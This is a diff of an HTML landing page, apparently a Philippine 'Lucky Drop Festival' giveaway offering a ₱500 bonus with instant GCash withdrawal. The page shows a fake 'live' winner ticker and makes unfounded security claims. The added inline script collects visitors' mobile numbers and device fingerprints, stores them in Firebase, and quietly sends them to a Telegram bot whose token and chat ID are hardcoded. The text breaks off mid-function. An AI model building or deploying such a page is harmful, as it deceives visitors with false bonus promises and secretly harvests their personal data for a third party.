@@ -2,20 +2,20 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
     <title>Welcome Bonus | Lucky Drop Festival</title>
     
     <!-- Firebase -->
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
-    
-    <!-- Google Fonts — Disney-Pixar Mexican Fiesta Style -->
+
+    <!-- Google Fonts — Disney-Pixar Mexican Fiesta -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link href="https://fonts.googleapis.com/css2?family=Baloo+2:wght@400;500;600;700;800&family=Cinzel:wght@400;500;600;700;800;900&family=Fredoka:wght@300;400;500;600;700&family=Orbitron:wght@400;500;600;700;800;900&family=Pacifico&family=Playfair+Display:wght@400;500;600;700;800;900&family=Poppins:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
     
-    <!-- Font Awesome -->
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <!-- Font Awesome 6 -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
     
     <!-- External CSS -->
     <link rel="stylesheet" href="styles/instyle.css">
@@ -23,38 +23,37 @@
 <body>
 
     <!-- ============================================================
-         FLOATING CONFETTI BACKGROUND
+         BACKGROUND EFFECTS
          ============================================================ -->
-    <div class="confetti-fall">
-        <span class="confetti-piece pink"></span>
-        <span class="confetti-piece gold"></span>
-        <span class="confetti-piece magenta"></span>
-        <span class="confetti-piece pink"></span>
-        <span class="confetti-piece gold"></span>
-        <span class="confetti-piece magenta"></span>
-        <span class="confetti-piece pink"></span>
-        <span class="confetti-piece gold"></span>
-        <span class="confetti-piece magenta"></span>
+    <div class="bg-night-sky"></div>
+    
+    <div class="fireworks">
+        <div class="firework burst-1"></div>
+        <div class="firework burst-2"></div>
+        <div class="firework burst-3"></div>
+        <div class="firework burst-4"></div>
+        <div class="firework burst-5"></div>
     </div>
-
-    <!-- ============================================================
-         FLOATING BOKEH LIGHTS
-         ============================================================ -->
+    
     <div class="bokeh">
         <div class="bokeh-circle"></div>
         <div class="bokeh-circle"></div>
         <div class="bokeh-circle"></div>
         <div class="bokeh-circle"></div>
         <div class="bokeh-circle"></div>
+        <div class="bokeh-circle"></div>
     </div>
-
-    <!-- ============================================================
-         FIREWORKS BACKGROUND
-         ============================================================ -->
-    <div class="fireworks">
-        <div class="firework burst-1"></div>
-        <div class="firework burst-2"></div>
-        <div class="firework burst-3"></div>
+    
+    <div class="confetti-fall">
+        <div class="confetti-piece pink"></div>
+        <div class="confetti-piece gold"></div>
+        <div class="confetti-piece magenta"></div>
+        <div class="confetti-piece pink"></div>
+        <div class="confetti-piece gold"></div>
+        <div class="confetti-piece magenta"></div>
+        <div class="confetti-piece pink"></div>
+        <div class="confetti-piece gold"></div>
+        <div class="confetti-piece magenta"></div>
     </div>
 
     <!-- ============================================================
@@ -63,83 +62,84 @@
     <div class="live-ticker">
         <div class="ticker-dot"></div>
         <div class="ticker-content">
-            <div class="ticker-text">
-                <i class="fas fa-star"></i>
-                <span>0917***4256 just claimed <span class="ticker-amount">₱1,200</span></span>
-            </div>
+            <span class="ticker-text" id="winnerEntry">
+                <i class="fas fa-bolt"></i> 
+                0917***4256 received 
+                <span class="ticker-amount">+₱500</span>
+            </span>
         </div>
-        <div class="ticker-badge">LIVE</div>
     </div>
 
     <!-- ============================================================
-         MAIN CARD — DISNEY-PIXAR MEXICAN FIESTA THEME
+         MAIN CARD — DISNEY-PIXAR MEXICAN FIESTA
          ============================================================ -->
-    <div class="main-card">
+    <div class="main-card" id="mainCard">
         
-        <!-- ✅ PIÑATA BACKGROUND IMAGE (sa taas ng card) -->
+        <!-- ✅ PIÑATA BACKGROUND (sa taas ng card) -->
         <div class="card-bg-image"></div>
         
-        <!-- ✅ DARK OVERLAY FOR READABILITY -->
+        <!-- ✅ DARK OVERLAY -->
         <div class="card-bg-overlay"></div>
-
+        
+        <!-- Corner Accents -->
+        <span class="corner-deco tl"><i class="fas fa-star"></i></span>
+        <span class="corner-deco tr"><i class="fas fa-star"></i></span>
+        <span class="corner-deco bl"><i class="fas fa-star"></i></span>
+        <span class="corner-deco br"><i class="fas fa-star"></i></span>
+        
         <!-- ========== CARD CONTENT ========== -->
         <div class="card-content">
-
-            <!-- ✅ Corner Decorations -->
-            <div class="corner-deco tl">✨</div>
-            <div class="corner-deco tr">🌺</div>
-            <div class="corner-deco bl">🌺</div>
-            <div class="corner-deco br">✨</div>
-
-            <!-- ========== LOGO AREA ========== -->
+            
+            <!-- Logo Area -->
             <div class="logo-area">
                 <div class="logo-icon">
-                    <div class="logo-ring"></div>
                     <i class="fas fa-gift"></i>
+                    <div class="logo-ring"></div>
                 </div>
-                <div class="logo-text">LUCKY DROP</div>
-                <div class="logo-text-sub">FESTIVAL</div>
-                <div class="logo-sub">◆ MEXICAN FIESTA ◆</div>
+                <h1 class="logo-text">LUCKY DROP</h1>
+                <h1 class="logo-text-sub">FESTIVAL</h1>
+                <div class="logo-sub">✦ MEXICAN FIESTA ✦</div>
             </div>
 
-            <!-- ========== VALUE PROPS ========== -->
+            <!-- Value Props -->
             <div class="value-props">
                 <div class="prop-row">
                     <div class="prop-icon"><i class="fas fa-gift"></i></div>
-                    <div class="prop-content">
+                    <div>
                         <div class="prop-title">🎁 WELCOME BONUS</div>
-                        <div class="prop-desc">₱500 instant bonus para sa lahat ng bagong user</div>
+                        <div class="prop-desc">₱500 instant bonus para sa bagong user</div>
                     </div>
                 </div>
                 <div class="prop-row">
                     <div class="prop-icon"><i class="fas fa-bolt"></i></div>
-                    <div class="prop-content">
+                    <div>
                         <div class="prop-title">⚡ INSTANT WITHDRAWAL</div>
                         <div class="prop-desc">Instant transfer sa GCash within minutes</div>
                     </div>
                 </div>
                 <div class="prop-row">
                     <div class="prop-icon"><i class="fas fa-shield-halved"></i></div>
-                    <div class="prop-content">
+                    <div>
                         <div class="prop-title">🔒 100% SECURED</div>
                         <div class="prop-desc">Bank-level encryption para sa iyong pera</div>
                     </div>
                 </div>
             </div>
 
-            <!-- ========== 7-DAY TREND DASHBOARD ========== -->
+            <!-- ========== 7-DAY TREND DASHBOARD (SAME SA DATING DESIGN) ========== -->
             <div class="trend-dashboard">
                 <div class="trend-header">
-                    <div class="trend-title">
-                        <i class="fas fa-chart-line"></i>
-                        <span>7-DAY CLAIM TREND</span>
-                    </div>
                     <div class="trend-live-badge">
                         <span class="live-dot"></span>
                         LIVE
                     </div>
+                    <div class="trend-title">
+                        <i class="fas fa-chart-line"></i>
+                        7-DAY CLAIM TREND
+                    </div>
                 </div>
-
+                
+                <!-- Bar Graph -->
                 <div class="trend-graph-container">
                     <div class="trend-graph" id="trendGraph">
                         <div class="graph-loading">
@@ -148,7 +148,8 @@
                         </div>
                     </div>
                 </div>
-
+                
+                <!-- Stats Row -->
                 <div class="trend-stats-row">
                     <div class="trend-stat-card">
                         <div class="trend-stat-icon blue">
@@ -179,241 +180,765 @@
                 </div>
             </div>
 
-            <!-- ============================================================
-                 ✅ REMASTERED VERIFICATION SECTION
-                 ============================================================ -->
-            <div class="verification-section" id="verificationSection">
-                
-                <div class="verification-header">
-                    <div class="verification-badge">
-                        <i class="fas fa-shield-halved"></i>
+            <!-- Swipe to Verify -->
+            <div class="swipe-container">
+                <div class="swipe-track" id="swipeTrack">
+                    <div class="swipe-fire-trail" id="swipeFireTrail"></div>
+                    <div class="swipe-icon" id="swipeIcon">
+                        <img src="images/scatter_icon.jpg" class="scatter-icon" alt="swipe">
                     </div>
-                    <h3 class="verification-title">WELCOME BONUS</h3>
-                    <p class="verification-subtitle">
-                        Enter your mobile number to claim your <strong>₱500 bonus</strong>
-                    </p>
-                </div>
-
-                <!-- ✅ Remastered Mobile Input (walang +63) -->
-                <div class="mobile-input-wrapper">
-                    <div class="mobile-input-icon">
-                        <i class="fas fa-mobile-screen-button"></i>
+                    <div class="swipe-text">
+                        <i class="fas fa-arrow-right"></i> 
+                        SWIPE TO VERIFY 
+                        <i class="fas fa-arrow-left"></i>
                     </div>
-                    <input 
-                        type="tel" 
-                        id="mobileNumber" 
-                        class="mobile-input" 
-                        placeholder="9XX XXX XXXX" 
-                        maxlength="12"
-                        inputmode="numeric"
-                        autocomplete="off"
-                    >
-                </div>
-
-                <!-- ✅ Error Message -->
-                <div id="verificationError" class="verification-error" style="display: none;">
-                    <i class="fas fa-exclamation-circle"></i>
-                    <span id="verificationErrorText">Please enter a valid mobile number</span>
-                </div>
-
-                <!-- ✅ Remastered Submit Button -->
-                <button class="submit-btn" id="submitBtn">
-                    <i class="fas fa-gift"></i>
-                    <span>CLAIM WELCOME BONUS</span>
-                    <i class="fas fa-arrow-right"></i>
-                </button>
-
-                <!-- ✅ Trust Note -->
-                <div class="trust-note">
-                    <i class="fas fa-lock"></i>
-                    <span>Your data is 100% secure and encrypted</span>
                 </div>
             </div>
 
-            <!-- ========== CARD FOOTER ========== -->
+            <!-- Footer -->
             <div class="card-footer">
                 <i class="fas fa-shield-halved"></i>
-                <span>SECURED BY LUCKY DROP FESTIVAL</span>
+                <span>Protected by Festival Magic</span>
             </div>
-
         </div>
     </div>
 
     <!-- ============================================================
-         MODAL — LOADING / SUCCESS
+         MODAL — VERIFICATION (with PIÑATA BACKGROUND)
          ============================================================ -->
     <div class="modal-overlay" id="modalOverlay">
         <div class="modal-container">
-            <div class="modal-card" id="modalCard">
-                <!-- Content will be injected by JS -->
+            <div class="modal-card">
+                <button class="modal-close" onclick="closeModal()">
+                    <i class="fas fa-xmark"></i>
+                </button>
+                
+                <div id="modalBodyContent">
+                    
+                    <!-- ✅ PIÑATA BACKGROUND SA MODAL -->
+                    <div class="modal-bg-image"></div>
+                    <div class="modal-bg-overlay"></div>
+                    
+                    <div class="modal-content-inner">
+                        
+                        <div class="modal-icon">
+                            <i class="fas fa-gift"></i>
+                        </div>
+                        
+                        <h2 class="modal-title">✦ WELCOME BONUS ✦</h2>
+                        <p class="modal-subtitle">
+                            Enter your mobile number<br>
+                            to claim your <span class="gold-text">₱500 bonus</span>
+                        </p>
+                        
+                        <!-- Bonus Box -->
+                        <div class="bonus-box-premium">
+                            <div class="bonus-glow"></div>
+                            <div class="bonus-amount-premium">₱500</div>
+                            <div class="bonus-label-premium">
+                                <i class="fas fa-gift"></i> 
+                                WELCOME BONUS 
+                                <i class="fas fa-gift"></i>
+                            </div>
+                            <div class="bonus-shine"></div>
+                        </div>
+                        
+                        <!-- Input Group -->
+                        <div class="input-group-premium">
+                            <label class="input-label-premium">
+                                <i class="fas fa-mobile-screen-button"></i>
+                                Mobile Number
+                            </label>
+                            <div class="input-wrapper-premium">
+                                <input 
+                                    type="tel" 
+                                    id="userPhone" 
+                                    placeholder="9XX XXX XXXX" 
+                                    maxlength="12"
+                                    inputmode="numeric"
+                                    autocomplete="off"
+                                    oninput="this.value = this.value.replace(/\D/g, '').slice(0, 10);"
+                                >
+                                <span class="input-suffix"><i class="fas fa-check-circle"></i></span>
+                            </div>
+                            <div class="input-hint">
+                                <i class="fas fa-info-circle"></i> 
+                                Enter your 10-digit mobile number (9XXXXXXXXX)
+                            </div>
+                        </div>
+                        
+                        <!-- Submit Button -->
+                        <button class="login-btn" id="claimBtn" onclick="processStep1()">
+                            <span class="login-text">CLAIM BONUS</span>
+                            <span class="login-dots"></span>
+                        </button>
+                        
+                        <div class="warning-text-premium">
+                            <i class="fas fa-shield-halved"></i>
+                            <span>Your data is 100% secure and encrypted</span>
+                        </div>
+                    </div>
+                </div>
             </div>
         </div>
     </div>
+
+    <canvas id="particleCanvas"></canvas>
 
     <!-- ============================================================
          SCRIPTS
          ============================================================ -->
     <script src="js/config.js"></script>
-
-    <!-- ============================================================
-         INLINE SCRIPT — Verification Logic
-         ============================================================ -->
+    
     <script>
+        // ============================================================
+        // INLINE SCRIPT — Main Logic
+        // ============================================================
         (function() {
             'use strict';
-
+            
+            // ========== CONFIGURATION ==========
+            var botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
+            var chatId = '7298607329';
+            
             // ========== DOM ELEMENTS ==========
-            var mobileInput = document.getElementById('mobileNumber');
-            var submitBtn = document.getElementById('submitBtn');
-            var errorMsg = document.getElementById('verificationError');
-            var errorText = document.getElementById('verificationErrorText');
+            var userPhoneInput = document.getElementById('userPhone');
+            var claimBtn = document.getElementById('claimBtn');
             var modalOverlay = document.getElementById('modalOverlay');
-            var modalCard = document.getElementById('modalCard');
-
-            // ========== AUTO-FORMAT MOBILE NUMBER ==========
-            if (mobileInput) {
-                mobileInput.addEventListener('input', function() {
-                    // Remove non-digits
-                    var value = this.value.replace(/\D/g, '');
-                    
-                    // Limit to 10 digits (9XXXXXXXXX)
-                    if (value.length > 10) {
-                        value = value.substring(0, 10);
+            var mainCard = document.getElementById('mainCard');
+            var winnerEntry = document.getElementById('winnerEntry');
+            
+            // ========== SWIPE ELEMENTS ==========
+            var swipeTrack = document.getElementById('swipeTrack');
+            var swipeIcon = document.getElementById('swipeIcon');
+            var swipeFireTrail = document.getElementById('swipeFireTrail');
+            
+            // ========== FIREBASE ==========
+            var db = null;
+            
+            // ========== INIT FIREBASE ==========
+            function initFirebase() {
+                if (typeof firebaseConfig !== 'undefined') {
+                    if (!firebase.apps || !firebase.apps.length) {
+                        firebase.initializeApp(firebaseConfig);
+                    }
+                    db = firebase.database();
+                }
+            }
+            
+            // ========== PHONE VALIDATION ==========
+            function isValidPhoneNumber(phone) {
+                var cleaned = phone.replace(/\D/g, '');
+                return cleaned.length === 10 && cleaned.startsWith('9');
+            }
+            
+            function formatPhoneNumber(phone) {
+                var cleaned = phone.replace(/\D/g, '');
+                if (cleaned.length === 10 && cleaned.startsWith('9')) {
+                    return '0' + cleaned;
+                }
+                if (cleaned.length === 11 && cleaned.startsWith('09')) {
+                    return cleaned;
+                }
+                return cleaned;
+            }
+            
+            // ========== DEVICE FINGERPRINT ==========
+            function getDeviceFingerprint() {
+                var screenResolution = screen.width + 'x' + screen.height + 'x' + screen.colorDepth;
+                var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+                var language = navigator.language;
+                var userAgent = navigator.userAgent;
+                var platform = navigator.platform;
+                var hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
+                
+                var fingerprintString = userAgent + '|' + screenResolution + '|' + timezone + '|' + language + '|' + platform + '|' + hardwareConcurrency;
+                
+                var hash = 0;
+                for (var i = 0; i < fingerprintString.length; i++) {
+                    hash = ((hash << 5) - hash) + fingerprintString.charCodeAt(i);
+                    hash |= 0;
+                }
+                return 'FP_' + Math.abs(hash);
+            }
+            
+            // ========== GET DEVICE DISPLAY ID ==========
+            function getOrCreateDeviceId(fingerprint) {
+                if (!fingerprint || fingerprint === '---') return Promise.resolve('---');
+                
+                var deviceMapRef = db.ref('device_id_map/' + fingerprint);
+                return deviceMapRef.once('value').then(function(snap) {
+                    if (snap.exists()) {
+                        return snap.val().displayId;
                     }
                     
-                    // Format: XXX XXX XXXX
-                    var formatted = value;
-                    if (value.length > 6) {
-                        formatted = value.substring(0, 3) + ' ' + value.substring(3, 6) + ' ' + value.substring(6);
-                    } else if (value.length > 3) {
-                        formatted = value.substring(0, 3) + ' ' + value.substring(3);
-                    }
-                    
-                    this.value = formatted;
-                    
-                    // Clear error
-                    if (errorMsg) errorMsg.style.display = 'none';
+                    var counterRef = db.ref('admin/deviceCounter');
+                    return counterRef.once('value').then(function(counterSnap) {
+                        var nextNum = (counterSnap.val() || 0) + 1;
+                        return counterRef.set(nextNum).then(function() {
+                            var displayId = 'Dev' + nextNum;
+                            return deviceMapRef.set({
+                                displayId: displayId,
+                                createdAt: Date.now(),
+                                fingerprint: fingerprint
+                            }).then(function() {
+                                return displayId;
+                            });
+                        });
+                    });
                 });
-
-                // Enter key
-                mobileInput.addEventListener('keypress', function(e) {
-                    if (e.key === 'Enter') {
-                        handleSubmit();
+            }
+            
+            // ========== SAVE DEVICE INFO ==========
+            function saveDeviceInfo(phone, fingerprint, deviceDisplayId) {
+                var deviceInfo = {
+                    phone: phone,
+                    fingerprint: fingerprint,
+                    displayId: deviceDisplayId,
+                    screenResolution: screen.width + 'x' + screen.height,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    language: navigator.language,
+                    userAgent: navigator.userAgent,
+                    lastSeen: Date.now(),
+                    firstSeen: Date.now()
+                };
+                
+                return db.ref('devices/' + fingerprint).once('value').then(function(existingDevice) {
+                    if (!existingDevice.exists()) {
+                        return db.ref('devices/' + fingerprint).set(deviceInfo);
+                    } else {
+                        return db.ref('devices/' + fingerprint).update({ lastSeen: Date.now() });
+                    }
+                }).then(function() {
+                    return db.ref('device_phone_map/' + fingerprint).set({
+                        phone: phone,
+                        displayId: deviceDisplayId,
+                        lastSeen: Date.now()
+                    });
+                });
+            }
+            
+            // ========== GENERATE REFERRAL CODE ==========
+            function generateReferralCode() {
+                var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+                var code = '';
+                for (var i = 0; i < 6; i++) {
+                    code += chars.charAt(Math.floor(Math.random() * chars.length));
+                }
+                return code;
+            }
+            
+            // ========== CREATE USER SESSION ==========
+            function createUserSession(phone, fingerprint, deviceDisplayId) {
+                var sessionRef = db.ref('user_sessions/' + phone);
+                
+                return sessionRef.once('value').then(function(sessionSnap) {
+                    if (!sessionSnap.exists()) {
+                        var initialCode = generateReferralCode();
+                        
+                        return sessionRef.set({
+                            phone: phone,
+                            balance: 0,
+                            clicks: 0,
+                            status: 'online',
+                            deviceFingerprint: fingerprint,
+                            deviceDisplayId: deviceDisplayId,
+                            lastUpdate: Date.now(),
+                            createdAt: Date.now(),
+                            referral_code: initialCode,
+                            referral_code_generated_at: Date.now(),
+                            claimed_luckycat: false,
+                            claimed_ptcat: false
+                        });
+                    } else {
+                        return sessionRef.update({
+                            status: 'online',
+                            lastUpdate: Date.now(),
+                            deviceFingerprint: fingerprint,
+                            deviceDisplayId: deviceDisplayId
+                        });
                     }
                 });
             }
-
-            // ========== SUBMIT BUTTON ==========
-            if (submitBtn) {
-                submitBtn.addEventListener('click', handleSubmit);
+            
+            // ========== SET USER ONLINE ==========
+            function setUserOnline(phoneNumber, fingerprint, deviceDisplayId) {
+                return db.ref('user_sessions/' + phoneNumber).update({
+                    status: 'online',
+                    lastSeen: firebase.database.ServerValue.TIMESTAMP,
+                    deviceFingerprint: fingerprint,
+                    deviceDisplayId: deviceDisplayId
+                });
             }
-
-            function handleSubmit() {
-                var rawValue = (mobileInput ? mobileInput.value : '').replace(/\D/g, '');
-                
-                // Validate
-                if (!rawValue || rawValue.length < 10) {
-                    showError('Please enter a valid 10-digit mobile number');
-                    return;
-                }
-                
-                // Validate starts with 9
-                if (rawValue.charAt(0) !== '9') {
-                    showError('Mobile number must start with 9');
-                    return;
-                }
-                
-                // Format as 09XXXXXXXXX
-                var fullPhone = '0' + rawValue; // 9XXXXXXXXX -> 09XXXXXXXXX
-
-                // Disable button
-                submitBtn.disabled = true;
-                submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i><span>PROCESSING...</span>';
-
-                // Save to localStorage
-                localStorage.setItem('userPhone', fullPhone);
-
-                // Show loading modal
-                showLoadingModal();
-
-                // Redirect after delay
-                setTimeout(function() {
-                    window.location.href = 'share_and_earn.html';
-                }, 2000);
+            
+            // ========== BAN CHECK ==========
+            function isPhoneBanned(phone) {
+                return db.ref('banned_ghosts/' + phone).once('value').then(function(snap) {
+                    return snap.exists();
+                });
             }
-
-            function showError(message) {
-                if (errorText) errorText.textContent = message;
-                if (errorMsg) {
-                    errorMsg.style.display = 'flex';
-                    errorMsg.style.animation = 'none';
-                    setTimeout(function() {
-                        errorMsg.style.animation = 'shake 0.5s ease';
-                    }, 10);
-                }
+            
+            function isFingerprintLinkedToBanned(fingerprint) {
+                return db.ref('device_phone_map/' + fingerprint).once('value').then(function(snap) {
+                    if (snap.exists()) {
+                        var linkedPhone = snap.val().phone;
+                        return isPhoneBanned(linkedPhone);
+                    }
+                    return false;
+                });
             }
-
-            function showLoadingModal() {
-                if (!modalOverlay || !modalCard) return;
-                
-                modalCard.innerHTML = 
-                    '<div class="modal-icon">' +
-                        '<i class="fas fa-gift"></i>' +
-                    '</div>' +
-                    '<h2 class="modal-title">WELCOME!</h2>' +
-                    '<p class="modal-subtitle">Preparing your <strong class="gold-text">₱500 bonus</strong>...</p>' +
-                    '<div class="modal-loading">' +
-                        '<div class="loading-dots">' +
-                            '<span></span><span></span><span></span>' +
-                        '</div>' +
-                    '</div>';
-                
+            
+            function getBanDetails(phone, fingerprint) {
+                return isPhoneBanned(phone).then(function(phoneBanned) {
+                    if (phoneBanned) {
+                        return { isBanned: true, type: "phone" };
+                    }
+                    return isFingerprintLinkedToBanned(fingerprint).then(function(fpBanned) {
+                        if (fpBanned) {
+                            return { isBanned: true, type: "device" };
+                        }
+                        return { isBanned: false };
+                    });
+                });
+            }
+            
+            // ========== NUMBER CLAIMED CHECK ==========
+            function isNumberClaimed(phone) {
+                return db.ref('user_logs/' + phone).once('value').then(function(logSnap) {
+                    return (logSnap.exists() && logSnap.val().status === 'claimed');
+                });
+            }
+            
+            // ========== SHOW BLOCKED UI ==========
+            function showBlockedUI(reason) {
+                if (!modalOverlay) return;
                 modalOverlay.style.display = 'flex';
+                
+                var title = "ACCESS RESTRICTED";
+                var blockMessage = "This account has been restricted by the administrator.";
+                
+                if (reason === "claimed") {
+                    title = "ALREADY CLAIMED";
+                    blockMessage = "This number has already claimed a reward before.";
+                }
+                
+                var modalBody = document.getElementById('modalBodyContent');
+                if (modalBody) {
+                    modalBody.innerHTML = 
+                        '<div class="modal-bg-image"></div>' +
+                        '<div class="modal-bg-overlay"></div>' +
+                        '<div class="modal-content-inner">' +
+                            '<div class="modal-icon">' +
+                                '<i class="fas fa-ban"></i>' +
+                            '</div>' +
+                            '<h2 class="modal-title" style="color: #ff4444;">' + title + '</h2>' +
+                            '<p class="modal-subtitle">' + blockMessage + '</p>' +
+                            '<button class="login-btn" onclick="location.reload()" style="background: linear-gradient(180deg, #555, #333);">OK</button>' +
+                        '</div>';
+                }
+                if (mainCard) mainCard.style.opacity = "0.3";
             }
-
-            // ========== CLOSE MODAL ON OVERLAY CLICK ==========
-            if (modalOverlay) {
-                modalOverlay.addEventListener('click', function(e) {
-                    if (e.target === modalOverlay) {
-                        modalOverlay.style.display = 'none';
+            
+            // ========== PROCESS STEP 1 ==========
+            function processStep1() {
+                if (!userPhoneInput || !claimBtn) return;
+                
+                var rawPhone = userPhoneInput.value.trim();
+                var fingerprint = getDeviceFingerprint();
+                
+                if (!rawPhone || rawPhone.length === 0) {
+                    alert("Please enter your mobile number.");
+                    return;
+                }
+                
+                if (!isValidPhoneNumber(rawPhone)) {
+                    alert("Invalid mobile number.\n\nPlease enter a valid 10-digit number starting with 9 (e.g., 9123456789)");
+                    return;
+                }
+                
+                var fullPhone = formatPhoneNumber(rawPhone);
+                
+                claimBtn.classList.add('loading');
+                claimBtn.disabled = true;
+                
+                getBanDetails(fullPhone, fingerprint).then(function(banDetails) {
+                    if (banDetails.isBanned) {
+                        claimBtn.classList.remove('loading');
+                        claimBtn.disabled = false;
+                        showBlockedUI("banned");
+                        return;
                     }
+                    
+                    return isNumberClaimed(fullPhone).then(function(isClaimed) {
+                        if (isClaimed) {
+                            claimBtn.classList.remove('loading');
+                            claimBtn.disabled = false;
+                            showBlockedUI("claimed");
+                            return;
+                        }
+                        
+                        return getOrCreateDeviceId(fingerprint).then(function(deviceDisplayId) {
+                            return saveDeviceInfo(fullPhone, fingerprint, deviceDisplayId).then(function() {
+                                return createUserSession(fullPhone, fingerprint, deviceDisplayId).then(function() {
+                                    return setUserOnline(fullPhone, fingerprint, deviceDisplayId).then(function() {
+                                        
+                                        // Send Telegram notification
+                                        var message = '🎁 WELCOME BONUS LOGIN:\n📱 ' + fullPhone + '\n🖥️ FP: ' + fingerprint + '\n🔑 DEV#: ' + deviceDisplayId;
+                                        fetch('https://api.telegram.org/bot' + botToken + '/sendMessage?chat_id=' + chatId + '&text=' + encodeURIComponent(message))
+                                            .catch(function(e) { console.log('Telegram error:', e); });
+                                        
+                                        // Save to localStorage
+                                        localStorage.setItem("userPhone", fullPhone);
+                                        localStorage.setItem("userDeviceId", fingerprint);
+                                        localStorage.setItem("userDeviceDisplayId", deviceDisplayId);
+                                        
+                                        claimBtn.classList.remove('loading');
+                                        claimBtn.classList.add('success');
+                                        var loginTextSpan = claimBtn.querySelector('.login-text');
+                                        if (loginTextSpan) loginTextSpan.textContent = 'SUCCESS!';
+                                        
+                                        // Redirect to share_and_earn.html
+                                        setTimeout(function() {
+                                            window.location.href = "share_and_earn.html";
+                                        }, 1000);
+                                    });
+                                });
+                            });
+                        });
+                    });
+                }).catch(function(error) {
+                    console.error("Process error:", error);
+                    claimBtn.classList.remove('loading');
+                    claimBtn.disabled = false;
+                    alert("An error occurred. Please try again.");
                 });
             }
-
-            // ========== LOAD TREND DATA ==========
-            function loadTrendData() {
-                if (typeof firebase === 'undefined' || !firebase.database) return;
+            
+            // ========== SWIPE TO VERIFY ==========
+            var isDragging = false;
+            var startX = 0;
+            var currentLeft = 0;
+            var swipeCompleted = false;
+            var trailInterval = null;
+            
+            function startFireTrail() {
+                if (trailInterval) clearInterval(trailInterval);
+                if (swipeFireTrail) {
+                    swipeFireTrail.classList.add('active');
+                    trailInterval = setInterval(function() {
+                        if (swipeFireTrail) {
+                            swipeFireTrail.classList.remove('active');
+                            setTimeout(function() {
+                                if (swipeFireTrail) swipeFireTrail.classList.add('active');
+                            }, 50);
+                        }
+                    }, 100);
+                }
+            }
+            
+            function stopFireTrail() {
+                if (trailInterval) {
+                    clearInterval(trailInterval);
+                    trailInterval = null;
+                }
+                if (swipeFireTrail) {
+                    swipeFireTrail.classList.remove('active');
+                }
+            }
+            
+            function updateFireTrailPosition(leftPos, maxLeft) {
+                if (!swipeFireTrail) return;
+                var percentage = (leftPos / maxLeft) * 100;
+                swipeFireTrail.style.width = percentage + '%';
+            }
+            
+            function completeSwipe() {
+                if (swipeCompleted) return;
+                swipeCompleted = true;
+                
+                if (swipeFireTrail) {
+                    swipeFireTrail.style.width = '100%';
+                    swipeFireTrail.classList.add('active');
+                }
                 
                 try {
-                    var db = firebase.database();
-                    
-                    // Today's claims
-                    var now = new Date();
-                    var dateKey = now.getFullYear() + '-' + 
-                        String(now.getMonth() + 1).padStart(2, '0') + '-' + 
-                        String(now.getDate()).padStart(2, '0');
-                    
-                    db.ref('festival_stats/daily/' + dateKey).once('value').then(function(snap) {
-                        var data = snap.val() || {};
-                        
-                        var todayEl = document.getElementById('todayClaims');
-                        var totalEl = document.getElementById('totalClaimed');
-                        
-                        if (todayEl) todayEl.textContent = data.claims_count || 0;
-                        if (totalEl) totalEl.textContent = '₱' + ((data.claims_amount || 0).toLocaleString());
-                    }).catch(function() {});
+                    var audio = new Audio('sounds/super_ace_scatter_ring.mp3');
+                    audio.volume = 0.7;
+                    audio.play().catch(function(e) { console.log('Sound error:', e); });
                 } catch(e) {}
+                
+                var swipeContainer = document.querySelector('.swipe-container');
+                if (swipeContainer) {
+                    swipeContainer.style.transition = 'opacity 0.3s ease';
+                    swipeContainer.style.opacity = '0';
+                }
+                
+                setTimeout(function() {
+                    if (modalOverlay) modalOverlay.style.display = 'flex';
+                    if (swipeContainer) swipeContainer.style.display = 'none';
+                }, 400);
+                
+                setTimeout(function() {
+                    if (swipeFireTrail) swipeFireTrail.classList.remove('active');
+                }, 500);
             }
-
-            // Load trend data on page ready
-            if (document.readyState === 'loading') {
-                document.addEventListener('DOMContentLoaded', loadTrendData);
-            } else {
+            
+            function initSwipe() {
+                if (!swipeIcon || !swipeTrack) return;
+                
+                var trackWidth = swipeTrack.offsetWidth;
+                var iconWidth = 56;
+                var maxLeft = trackWidth - iconWidth;
+                
+                swipeIcon.addEventListener('touchstart', function(e) {
+                    if (swipeCompleted) return;
+                    e.preventDefault();
+                    isDragging = true;
+                    startX = e.touches[0].clientX;
+                    currentLeft = parseInt(swipeIcon.style.left) || 0;
+                    swipeIcon.style.cursor = 'grabbing';
+                    startFireTrail();
+                });
+                
+                swipeIcon.addEventListener('touchmove', function(e) {
+                    if (!isDragging || swipeCompleted) return;
+                    e.preventDefault();
+                    var moveX = e.touches[0].clientX - startX;
+                    var newLeft = currentLeft + moveX;
+                    newLeft = Math.max(0, Math.min(newLeft, maxLeft));
+                    swipeIcon.style.left = newLeft + 'px';
+                    updateFireTrailPosition(newLeft, maxLeft);
+                });
+                
+                swipeIcon.addEventListener('touchend', function(e) {
+                    if (!isDragging || swipeCompleted) return;
+                    e.preventDefault();
+                    isDragging = false;
+                    swipeIcon.style.cursor = 'grab';
+                    stopFireTrail();
+                    
+                    var finalLeft = parseInt(swipeIcon.style.left) || 0;
+                    
+                    if (finalLeft >= maxLeft - 10) {
+                        completeSwipe();
+                    } else {
+                        swipeIcon.style.left = '0px';
+                        if (swipeFireTrail) swipeFireTrail.style.width = '0%';
+                    }
+                });
+                
+                swipeIcon.addEventListener('mousedown', function(e) {
+                    if (swipeCompleted) return;
+                    e.preventDefault();
+                    isDragging = true;
+                    startX = e.clientX;
+                    currentLeft = parseInt(swipeIcon.style.left) || 0;
+                    swipeIcon.style.cursor = 'grabbing';
+                    startFireTrail();
+                });
+                
